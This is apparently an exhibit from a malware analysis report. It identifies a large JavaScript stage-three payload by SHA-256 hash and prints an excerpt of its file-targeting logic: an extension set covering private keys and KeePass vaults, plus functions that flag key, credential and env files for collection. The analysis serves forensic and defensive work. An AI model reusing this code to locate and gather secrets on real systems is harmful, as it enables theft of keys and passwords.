### Exhibit E05-1. `.kdbx` in the private-key extension set (`KEY_EXTENSIONS`)

Artifact: Large JavaScript stage-three payload (reference sample) · 1140214 bytes · SHA-256 `694626bed2df1f0d0026a3f7ead7692b44c7e73041cdd799b79a025335533cdc`
Location: line 10 and lines 315–331
Extraction: `sed -n '10p;315,331p' <ARTIFACT>`
Supports: `.kdbx` sits in a private-key extension set that collection predicates use

```text
const KEY_EXTENSIONS = new Set([".key", ".pem", ".asc", ".pfx", ".p12", ".ppk", ".gpg", ".kdbx"]);
function matchesPrivateKeyFile(name) {
  const base = path.basename(String(name || ""));
  if (SSH_KEY_FILENAMES.has(base)) return true;
  const ext = extOf(name);
  return KEY_EXTENSIONS.has(ext);
}

function matchesCredentialNamedSecretFile(name) {
  if (matchesPrivateKeyFile(name)) return true;
  if (!matchesCredentialFilename(name)) return false;
  const ext = extOf(name);
  return (
    KEY_EXTENSIONS.has(ext)
    || TEXT_EXTENSIONS.has(ext)
    || PAT_EXTENSIONS.has(ext)
    || matchesEnvFileName(name)
  );
```

`KEY_EXTENSIONS` is also used by `matchesSystemImpFile` (line 350) and `matchesDataDriveFile`
(line 362). Line 10 is byte-identical in the second large payload: SHA-256
`5498038886bab8a8db2159495c015f26e322708fc7a7f3ea698e7b7c06e3d148`, line 10 (E05-6).
